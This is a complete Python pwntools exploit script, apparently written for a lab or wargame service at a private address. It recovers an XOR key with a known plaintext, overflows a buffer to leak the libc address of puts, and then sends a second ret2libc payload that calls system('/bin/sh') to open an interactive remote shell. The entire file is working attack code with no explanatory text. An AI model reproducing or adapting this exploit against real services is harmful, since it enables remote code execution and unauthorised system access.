#!/usr/bin/env python3

from pwn import *


def encrypt(data):
    io.send("E")
    io.send((len(data)).to_bytes(4, "little"))
    io.send(data)

    print(io.recvline().decode())
    size = int.from_bytes(io.recv(4), "little")
    encrypted = b""
    while len(encrypted) < size:
        encrypted += io.recv(size)

    return encrypted


def get_key():
    print(io.recvline().decode())
    data = "A" * 128
    encrypted = encrypt(data)
    sample = data.encode()

    return bytes(a ^ b for a, b in zip(sample, encrypted))


io = remote('192.168.12.131', 20002)
key = get_key()

payload  = b"A" * 131088
payload += p32(0x08048930)  # Address of puts@plt
payload += b"AAAA"
payload += p32(0x0804b3b8)  # Address of puts@got

enc_data = b""
for i in range(0, len(payload), len(key)):
    enc_data += bytes(a ^ b for a, b in zip(payload[i:i+len(key)], key))
encrypt(enc_data)

io.send("Q")
puts_offset = 0x603b0
leak = u32(io.recv(4))
libc_base = leak - puts_offset
io.close()

# Now to get shell
io = remote('192.168.12.131', 20002)
key = get_key()

system_offset = 0x3cb20
exit_offset   = 0x329e0
binsh_offset  = 0x1388da

payload  = b"A" * 131088
payload += p32(libc_base + system_offset)
payload += p32(libc_base + exit_offset)
payload += p32(libc_base + binsh_offset)

enc_data = b""
for i in range(0, len(payload), len(key)):
    enc_data += bytes(a ^ b for a, b in zip(payload[i:i+len(key)], key))
encrypt(enc_data)

io.send("Q")
io.interactive()
